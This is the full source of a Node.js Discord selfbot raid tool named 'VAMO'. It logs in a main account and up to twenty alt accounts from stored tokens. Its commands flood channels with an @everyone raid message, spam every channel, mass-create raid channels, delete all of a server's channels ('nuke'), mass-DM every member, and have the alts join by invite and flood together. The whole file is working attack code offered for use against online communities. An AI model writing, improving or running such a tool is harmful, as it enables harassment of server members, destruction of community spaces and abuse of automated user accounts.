const { Client } = require('discord.js-selfbot-v13');
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('VAMO Multi-Account Raid Bot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

// Your exact raid message
const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

// Helper function for delay
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Load alt tokens from environment variables
function loadAltTokens() {
    const tokens = [];
    
    for (let i = 1; i <= 20; i++) {
        const token = process.env[`ALT${i}_TOKEN`];
        if (token && token.length > 10) {
            tokens.push(token);
            console.log(`✅ Found ALT${i}_TOKEN`);
        }
    }
    
    console.log(`📊 Total alt tokens loaded: ${tokens.length}`);
    return tokens;
}

// Make all alts join the server
async function joinServerWithAlts(guild, tokens) {
    console.log(`🔥 Making ${tokens.length} alts join server...`);
    
    let joined = 0;
    let failed = 0;
    
    // Create invite using main account
    let inviteCode = null;
    try {
        const channel = guild.channels.cache.find(c => c.type === 'GUILD_TEXT');
        if (channel) {
            const invite = await channel.createInvite({
                maxAge: 0,
                maxUses: tokens.length,
                reason: 'Raid auto-join'
            });
            inviteCode = invite.code;
            console.log(`✅ Created invite: discord.gg/${inviteCode}`);
        }
    } catch (error) {
        console.log(`❌ Could not create invite: ${error.message}`);
        return 0;
    }
    
    if (!inviteCode) {
        console.log('❌ No invite code available');
        return 0;
    }
    
    for (let i = 0; i < tokens.length; i++) {
        const token = tokens[i];
        
        try {
            const tempClient = new Client();
            await tempClient.login(token);
            console.log(`   ✅ Alt ${i+1} logged in: ${tempClient.user.tag}`);
            
            try {
                await tempClient.acceptInvite(inviteCode);
                console.log(`   ✅ Alt ${i+1} joined server`);
                joined++;
            } catch (inviteError) {
                console.log(`   ❌ Alt ${i+1} invite failed: ${inviteError.message}`);
                failed++;
            }
            
            await tempClient.destroy();
            await delay(2000);
            
        } catch (error) {
            failed++;
            console.log(`   ❌ Alt ${i+1} login failed: ${error.message}`);
        }
    }
    
    console.log(`✅ Join complete: ${joined} joined, ${failed} failed`);
    return joined;
}

// Main client
const mainClient = new Client();

mainClient.on('ready', () => {
    console.log(`✅ MAIN ACCOUNT logged in as ${mainClient.user.tag}`);
    console.log(`VAMO RAID SELFBOT READY`);
    console.log(`Type !help for all commands`);
});

mainClient.on('messageCreate', async (message) => {
    if (message.author.id !== mainClient.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== HELP COMMAND =====
    if (command === 'help') {
        await message.channel.send(`**🔥 VAMO RAID SELFBOT - ALL COMMANDS**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**🌊 FLOOD COMMANDS**
!flood [count] - Flood current channel (default 100)
!floodalts - All alts flood 100 messages each (sync)
!raidall - JOIN + FLOOD all alts together

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**⚡ CHANNEL COMMANDS**
!syncspam - 100 messages to ALL channels (sync)
!spamchannels [num] - Create raid channels (default 50)
!nuke - Delete all + create 100 raid channels

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**📨 DM COMMANDS**
!massdm - DM all members in server
!testdm - Test if DMs are working

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**👥 ALT MANAGEMENT**
!joinalts - Make all alts join current server
!status - Show loaded alt tokens count
!myperms - Check your permissions

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
**ℹ️ OTHER**
!help - Show this menu

✅ VAMO ACTIVATED`);
    }

    // ===== STATUS COMMAND =====
    if (command === 'status') {
        const tokens = loadAltTokens();
        await message.channel.send(`**📊 STATUS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Main Account: ${mainClient.user.tag}
Alt tokens loaded: ${tokens.length}
Current Server: ${message.guild.name}
Channel: #${message.channel.name}
Prefix: ${PREFIX}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
    }

    // ===== CHECK PERMISSIONS =====
    if (command === 'myperms') {
        const guild = message.guild;
        const member = guild.members.cache.get(mainClient.user.id);
        
        const perms = {
            sendMessages: member.permissions.has('SendMessages'),
            manageChannels: member.permissions.has('ManageChannels'),
            administrator: member.permissions.has('Administrator')
        };
        
        await message.channel.send(`**🔑 Your Permissions in ${guild.name}**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Send Messages: ${perms.sendMessages ? '✅' : '❌'}
Manage Channels: ${perms.manageChannels ? '✅' : '❌'}
Administrator: ${perms.administrator ? '✅' : '❌'}

Without Manage Channels, you CANNOT create/delete channels.
Mass DM and flood work regardless!`);
    }

    // ===== FLOOD (MAIN ONLY) =====
    if (command === 'flood') {
        const count = parseInt(args[0]) || 100;
        const channel = message.channel;

        await message.channel.send(`✅ VAMO ACTIVATED - Sending ${count} messages...`);

        console.log(`🔥 FLOOD: Sending ${count} messages to #${channel.name}...`);

        for (let i = 1; i <= count; i++) {
            try {
                await channel.send(raidMessage);
                
                if (i % 10 === 0) {
                    console.log(`   ✅ ${i}/${count} messages sent`);
                }
                
                await delay(1000);
                
            } catch (error) {
                console.log(`   ❌ Failed message ${i}: ${error.message}`);
                if (error.message.includes('rate')) {
                    await delay(5000);
                }
            }
        }

        console.log(`✅ FLOOD COMPLETE`);
        await message.channel.send(`✅ Sent ${count} messages!`);
    }

    // ===== SYNC SPAM (ALL CHANNELS) =====
    if (command === 'syncspam') {
        const guild = message.guild;
        
        await message.channel.send('✅ VAMO ACTIVATED - SYNC SPAM');
        
        const channels = guild.channels.cache.filter(c => 
            c.type === 'GUILD_TEXT' && 
            c.permissionsFor(guild.members.me).has('SendMessages')
        );

        const channelList = [...channels.values()];
        const channelCount = channelList.length;
        
        if (channelCount === 0) {
            await message.channel.send('❌ No accessible channels found');
            return;
        }

        console.log(`🔥 SYNC SPAM: ${channelCount} channels will get 100 messages TOGETHER`);

        let totalSent = 0;

        for (let msgNum = 1; msgNum <= 100; msgNum++) {
            console.log(`\n📢 Sending message #${msgNum} to ALL ${channelCount} channels...`);
            
            const sendPromises = channelList.map(async (channel) => {
                try {
                    await channel.send(raidMessage);
                    return { success: true };
                } catch (error) {
                    return { success: false };
                }
            });

            const results = await Promise.allSettled(sendPromises);
            const successful = results.filter(r => r.status === 'fulfilled' && r.value.success).length;
            totalSent += successful;
            
            console.log(`   ✅ Message #${msgNum} sent to ${successful}/${channelCount} channels`);
            await delay(1500);
        }

        console.log(`✅ SYNC SPAM COMPLETE! Total messages: ${totalSent}`);
    }

    // ===== SPAM CHANNELS (CREATE) =====
    if (command === 'spamchannels') {
        const guild = message.guild;
        
        await message.channel.send('✅ VAMO ACTIVATED');

        let channelCount = parseInt(args[0]) || 50;
        if (channelCount > 100) channelCount = 100;

        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        
        console.log(`🔥 Creating ${channelCount} channels...`);

        let created = 0;

        for (let i = 1; i <= channelCount; i++) {
            try {
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                await newChannel.send(raidMessage);
                created++;
                console.log(`✅ Created channel ${i}/${channelCount}`);
                await delay(1000);
            } catch (error) {
                console.log(`❌ Failed: ${error.message}`);
            }
        }

        await message.channel.send(`✅ Created ${created} channels!`);
    }

    // ===== NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        
        const member = guild.members.cache.get(mainClient.user.id);
        if (!member.permissions.has('ManageChannels')) {
            await message.channel.send('❌ Cannot nuke: Missing `Manage Channels` permission');
            return;
        }

        await message.channel.send('✅ VAMO ACTIVATED - NUKE STARTED');

        console.log('🔥 Deleting all channels...');
        let deleted = 0;
        
        for (const channel of guild.channels.cache.values()) {
            try {
                await channel.delete();
                deleted++;
                console.log(`✅ Deleted ${channel.name}`);
                await delay(800);
            } catch (error) {
                console.log(`❌ Failed to delete: ${error.message}`);
            }
        }
        console.log(`✅ Deleted ${deleted} channels`);

        console.log('🔥 Creating 100 channels...');
        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        let created = 0;

        for (let i = 1; i <= 100; i++) {
            try {
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                await newChannel.send(raidMessage);
                created++;
                console.log(`✅ Created channel ${i}/100`);
                await delay(1000);
            } catch (error) {
                console.log(`❌ Failed: ${error.message}`);
            }
        }

        console.log('✅ NUKE COMPLETE');
        await message.channel.send(`✅ NUKE COMPLETE! Deleted ${deleted} channels, Created ${created} channels`);
    }

    // ===== TEST DM =====
    if (command === 'testdm') {
        const guild = message.guild;
        
        const targetMember = guild.members.cache.find(m => !m.user.bot && m.id !== mainClient.user.id);
        
        if (!targetMember) {
            await message.channel.send('❌ No test target found');
            return;
        }
        
        await message.channel.send(`🧪 Testing DM to ${targetMember.user.tag}...`);
        
        try {
            await targetMember.send('This is a test DM from VAMO selfbot');
            await message.channel.send('✅ **TEST PASSED** - DMs are working!');
        } catch (error) {
            await message.channel.send(`❌ **TEST FAILED**
Error Code: ${error.code || 'none'}
Message: ${error.message}`);
        }
    }

    // ===== MASS DM =====
    if (command === 'massdm') {
        const guild = message.guild;
        await message.channel.send('✅ VAMO ACTIVATED - MASS DM STARTED');

        console.log(`🔥 Mass DM to ${guild.memberCount} members...`);

        let sent = 0;
        let blocked = 0;
        let failed = 0;

        for (const member of guild.members.cache.values()) {
            if (member.user.bot || member.id === mainClient.user.id) continue;

            try {
                await member.send(raidMessage);
                sent++;
                
                if (sent % 5 === 0) {
                    console.log(`✅ DMs sent: ${sent}`);
                }
                
                await delay(2500);
                
            } catch (error) {
                if (error.code === 50007) {
                    blocked++;
                } else {
                    failed++;
                }
                console.log(`   ❌ Failed: ${member.user.tag} - Code: ${error.code || 'none'}`);
                
                if (error.message && error.message.includes('rate')) {
                    await delay(10000);
                }
            }
        }

        console.log(`✅ MASS DM COMPLETE: Sent: ${sent}, Blocked: ${blocked}, Failed: ${failed}`);
        await message.channel.send(`**MassDM Complete**\n✅ Sent: ${sent}\n🔒 Privacy blocked: ${blocked}\n❌ Failed: ${failed}`);
    }

    // ===== JOIN ALTS ONLY =====
    if (command === 'joinalts') {
        const guild = message.guild;
        const tokens = loadAltTokens();
        
        if (tokens.length === 0) {
            await message.channel.send('❌ No alt tokens found');
            return;
        }
        
        await message.channel.send(`🔥 Making ${tokens.length} alts join...`);
        const joined = await joinServerWithAlts(guild, tokens);
        await message.channel.send(`✅ ${joined}/${tokens.length} alts joined!`);
    }

    // ===== FLOOD WITH ALTS =====
    if (command === 'floodalts') {
        await message.channel.send('✅ VAMO ACTIVATED - FLOODING WITH ALTS');
        
        const guild = message.guild;
        const tokens = loadAltTokens();
        
        if (tokens.length === 0) {
            await message.channel.send('❌ No alt tokens found');
            return;
        }
        
        const activeClients = [];
        const channel = message.channel;
        
        await message.channel.send(`🔥 Logging in ${tokens.length} alts...`);
        
        for (let i = 0; i < tokens.length; i++) {
            try {
                const altClient = new Client();
                
                altClient.on('ready', () => {
                    console.log(`   ✅ Alt ${i+1} ready: ${altClient.user.tag}`);
                    const altGuild = altClient.guilds.cache.get(guild.id);
                    if (altGuild) {
                        activeClients.push(altClient);
                    }
                });
                
                await altClient.login(tokens[i]);
                await delay(1000);
                
            } catch (error) {
                console.log(`   ❌ Alt ${i+1} login failed`);
            }
        }
        
        await delay(3000);
        
        if (activeClients.length === 0) {
            await message.channel.send('❌ No alts in this server! Use !joinalts first.');
            return;
        }
        
        const floodCount = 100;
        await message.channel.send(`🔥 ${activeClients.length} alts flooding ${floodCount} messages...`);
        
        for (let msgNum = 1; msgNum <= floodCount; msgNum++) {
            const roundPromises = activeClients.map(async (altClient) => {
                try {
                    const altGuild = altClient.guilds.cache.get(guild.id);
                    if (altGuild) {
                        const altChannel = altGuild.channels.cache.get(channel.id);
                        if (altChannel) {
                            await altChannel.send(raidMessage);
                        }
                    }
                } catch (e) {}
            });
            
            await Promise.allSettled(roundPromises);
            
            if (msgNum % 10 === 0) {
                console.log(`   ✅ Round ${msgNum}/${floodCount} complete`);
            }
            
            await delay(1500);
        }
        
        await message.channel.send(`✅ FLOOD COMPLETE! ${activeClients.length} alts sent ${floodCount} messages each!`);
        
        for (const altClient of activeClients) {
            try { await altClient.destroy(); } catch (e) {}
        }
    }

    // ===== RAID ALL =====
    if (command === 'raidall') {
        await message.channel.send('✅ VAMO ACTIVATED - RAIDING WITH ALL ALTS');
        
        const guild = message.guild;
        const tokens = loadAltTokens();
        
        if (tokens.length === 0) {
            await message.channel.send('❌ No alt tokens found');
            return;
        }
        
        await message.channel.send(`🔥 Found ${tokens.length} alt tokens`);
        
        // Step 1: Join alts
        await message.channel.send('📥 Step 1: Making alts join server...');
        const joined = await joinServerWithAlts(guild, tokens);
        
        if (joined === 0) {
            await message.channel.send('❌ No alts could join');
            return;
        }
        
        await delay(3000);
        
        // Step 2: Login and flood
        await message.channel.send(`🔥 Step 2: Logging in ${joined} alts for flood...`);
        
        const activeClients = [];
        const channel = message.channel;
        
        for (let i = 0; i < tokens.length; i++) {
            try {
                const altClient = new Client();
                
                altClient.on('ready', () => {
                    const altGuild = altClient.guilds.cache.get(guild.id);
                    if (altGuild) {
                        activeClients.push(altClient);
                        console.log(`   ✅ Alt ${i+1} ready`);
                    }
                });
                
                await altClient.login(tokens[i]);
                await delay(1000);
                
            } catch (error) {
                console.log(`   ❌ Alt ${i+1} login failed`);
            }
        }
        
        await delay(3000);
        
        if (activeClients.length === 0) {
            await message.channel.send('❌ No alts available for flood');
            return;
        }
        
        const floodCount = 100;
        await message.channel.send(`🔥 ${activeClients.length} alts flooding ${floodCount} messages...`);
        
        for (let msgNum = 1; msgNum <= floodCount; msgNum++) {
            const roundPromises = activeClients.map(async (altClient) => {
                try {
                    const altGuild = altClient.guilds.cache.get(guild.id);
                    if (altGuild) {
                        const altChannel = altGuild.channels.cache.get(channel.id);
                        if (altChannel) {
                            await altChannel.send(raidMessage);
                        }
                    }
                } catch (e) {}
            });
            
            await Promise.allSettled(roundPromises);
            
            if (msgNum % 10 === 0) {
                console.log(`   ✅ Round ${msgNum}/${floodCount} complete`);
            }
            
            await delay(1500);
        }
        
        await message.channel.send(`✅ RAID COMPLETE! ${activeClients.length} alts sent ${floodCount} messages each!`);
        
        for (const altClient of activeClients) {
            try { await altClient.destroy(); } catch (e) {}
        }
    }
});

// Login main account
const mainToken = process.env.MAIN_TOKEN;
if (!mainToken) {
    console.error('❌ ERROR: MAIN_TOKEN environment variable not set!');
    process.exit(1);
}

mainClient.login(mainToken);
